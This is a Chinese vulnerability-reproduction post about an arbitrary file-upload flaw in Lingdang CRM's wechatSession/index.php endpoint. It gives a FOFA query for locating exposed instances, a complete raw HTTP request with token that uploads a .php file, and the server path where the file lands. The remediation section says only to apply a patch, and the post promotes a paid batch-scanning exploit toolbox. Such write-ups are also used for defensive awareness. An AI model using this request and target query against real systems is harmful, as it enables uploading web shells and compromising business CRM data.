#  灵当CRM wechatSession/index.php接口处存在文件上传漏洞 附POC   
2024-10-14更新  南风漏洞复现文库   2024-10-14 23:27  
  
免责声明：  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。  
该文章仅供学习用途使用。  
## 1. 灵当CRM 简介  
  
微信公众号搜索：南风漏洞复现文库 该文章 南风漏洞复现文库 公众号首发  
  
灵当CRM致力于为企业提供客户管理数字化、销售管理自动化、服务管理智能化、项目管理一体化的个性化CRM行业解决方案。  
## 2.漏洞描述  
  
灵当CRM致力于为企业提供客户管理数字化、销售管理自动化、服务管理智能化、项目管理一体化的个性化CRM行业解决方案,构建全生命周期的数字化管理体系,实现可持续的业绩增长!。灵当CRM wechatSession/index.php接口处存在文件上传漏洞。  
  
CVE编号:  
  
CNNVD编号:  
  
CNVD编号:  
## 3.影响版本  
  
灵当CRM  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsJDm7fvc3bcjVEXLxD6IibndnHHQRd0g57Jx6TuT1BWLfOVE6VsqX2XTRJFcQ4IwTU4o39NOUtZ5CU2ZagP5oQ/640?wx_fmt=png&from=appmsg "null")  
  
灵当CRM wechatSession/index.php接口处存在文件上传漏洞  
## 4.fofa查询语句  
  
body="include/js/ldAjax.js"  
## 5.漏洞复现  
  
漏洞链接：http://xx.xx.xx.xx/crm/wechatSession/index.php?token=9b06a9617174f1085ddcfb4ccdb6837f&msgid=1&operation=upload  
  
漏洞数据包：  
```
POST /crm/wechatSession/index.php?token=9b06a9617174f1085ddcfb4ccdb6837f&msgid=1&operation=upload HTTP/1.1
Host: xx.xx.xx.xx
User-Agent:Mozilla/4.0(compatible; MSIE 8.0;Windows NT 6.1)
Accept-Encoding: gzip, deflate
Accept:*/*
Connection: close
Content-Length: 184
Content-Type: multipart/form-data; boundary=9f57d14038b72104f2b6fafebf51c117

--9f57d14038b72104f2b6fafebf51c117
Content-Disposition: form-data; name="file"; filename="132688.php"
Content-Type: image/jpeg

364994847804
--9f57d14038b72104f2b6fafebf51c117--

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bcjVEXLxD6IibndnHHQRd0g0qoeDGM8pR0EReyG8zRyAzjMvM3hGELdEYzIjXFS5s2lrcyztSOQIg/640?wx_fmt=jpeg&from=appmsg "null")  
  
会返回上传的文件路径：http://xx.xx.xx.xx/crm/storage/wechatsession/2024/10/14/583372.php  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bcjVEXLxD6IibndnHHQRd0g6VOib9Gcib9eRT68nnic8CJiats6NiaicVVJFqicXwlvrStFiaMa6FeiaP5mhbw/640?wx_fmt=jpeg&from=appmsg "null")  
## 6.POC&EXP  
  
本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全1: 更新poc批量扫描软件，承诺，一周更新8-14个插件吧，我会优先写使用量比较大程序漏洞。2: 免登录，免费fofa查询。3: 更新其他实用网络安全工具项目。4: 免费指纹识别，持续更新指纹库。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bcjVEXLxD6IibndnHHQRd0gnAqnUjmiaxIgGahy3kwfpqypz6Uic2lLlTMxKZsUm6JDThkfXOUeiaG3A/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bcjVEXLxD6IibndnHHQRd0gxpSKa1tDVEKBJgrhhlGSKubslUnLj6ENAn9zZDIEK0yn52oHVdaAdQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bcjVEXLxD6IibndnHHQRd0gYXNRQmsAkicbFVkj2CA3OggFguqxTEbrLoAoN8Ds6ENzo65yw6hQLQQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bcjVEXLxD6IibndnHHQRd0gnmibPmcMlQXjkoVtjYbZGa4VhlKicTLySjsXcEul8FT4ef7cYicibiaXSlA/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bcjVEXLxD6IibndnHHQRd0gKV6Au2T8xhRd2ISWdcS4hsSHJQJ2Zhp5bhbvp1W6iaoBt7xs2Z6yYww/640?wx_fmt=jpeg&from=appmsg "null")  
## 7.整改意见  
  
打补丁  
## 8.往期回顾  
  
  
  
